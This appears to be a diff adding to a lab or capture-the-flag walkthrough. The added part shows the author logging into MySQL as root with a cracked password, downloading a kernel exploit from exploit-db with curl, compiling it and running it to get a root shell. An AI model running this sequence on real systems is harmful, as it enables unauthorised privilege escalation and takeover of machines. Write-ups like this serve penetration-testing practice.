@@ -582,3 +582,56 @@ SELECT * FROM user;
 mysql> exit
 exit
 Bye
+
+John and root have the same hash, so we have root to the MySQL server.
+
+sh-3.00$ mysql -u root -p
+mysql -u root -p
+Enter password: hiroshima
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 91 to server version: 4.1.22
+
+That was fun an all, but doesn't help us get root on the box.  Tame to poke around some more.
+
+Exploit:
+
+Searching kernel version finds an exploit-db page.  https://www.exploit-db.com/exploits/9542/
+
+I'm going to start by breaking out of the python shell, less interactive but no echo.
+
+sh-3.00$ exit
+exit
+exit
+
+sh-3.00$ cd /tmp
+sh-3.00$ curl -k -O https://www.exploit-db.com/download/9542
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2645  100  2645    0     0   4573      0 --:--:-- --:--:-- --:--:--     0
+sh-3.00$
+
+sh-3.00$ ls     
+9542
+sh-3.00$ mv 9542 9542.c
+sh-3.00$ ls
+9542.c
+sh-3.00$ gcc -o a.out 9542.c
+sh-3.00$ ls -la
+total 32
+drwxr-xrwx   4 root   root   4096 May 19 09:30 .
+drwxr-xr-x  23 root   root   4096 May 19 07:12 ..
+-rw-r--r--   1 apache apache 2645 May 19 09:28 9542.c
+-rwxr-xr-x   1 apache apache 6932 May 19 09:30 a.out
+drwxrwxrwt   2 root   root   4096 May 19 07:13 .font-unix
+drwxrwxrwt   2 root   root   4096 May 19 07:12 .ICE-unix
+sh-3.00$
+
+sh-3.00$ chmod +x a.out
+sh-3.00$ ./a.out
+sh: no job control in this shell
+sh-3.00# whoami
+root
+sh-3.00#
+
+That was fun and all....but it doesn't feel like they wanted me to get root this way.  It feels like there is something with the CUPS daemon.  Maybe I'll play with it more later.
